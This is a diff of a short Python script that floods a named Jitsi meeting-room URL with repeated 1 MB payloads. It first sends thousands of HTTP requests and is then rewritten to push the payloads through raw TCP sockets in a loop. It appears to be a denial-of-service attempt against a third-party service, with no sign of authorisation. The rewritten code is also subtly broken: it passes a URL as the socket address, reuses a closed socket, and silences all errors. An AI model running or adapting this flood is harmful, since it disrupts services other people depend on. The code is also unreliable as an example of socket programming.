@@ -1,14 +1,18 @@
-import requests
-import time
+import socket
 
-url = "https://jitsi.pashmak.net/UnderlyingCriesSwingSideways"
-payload = b'a' * (1024 * 1024)
+ip = "https://jitsi.pashmak.net/UnderlyingCriesSwingSideways"
+port = 8080
 
-def send_packet(n):
-    start = time.time()
-    r = requests.get(url, data=payload,timeout=0.0001)
-    end = time.time()
-    print(f"Packet {n} | Status: {r.status_code} | RTT: {(end - start)*1000:.2f} ms")
+payload = b"x" * (1024 * 1024)
 
-for i in range(10000):
-    send_packet(i)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(0.001)
+
+for i in range(1000):
+    try:
+        sock.connect((ip, port))
+        sock.sendall(payload)
+    except:
+        pass
+    finally:
+        sock.close()
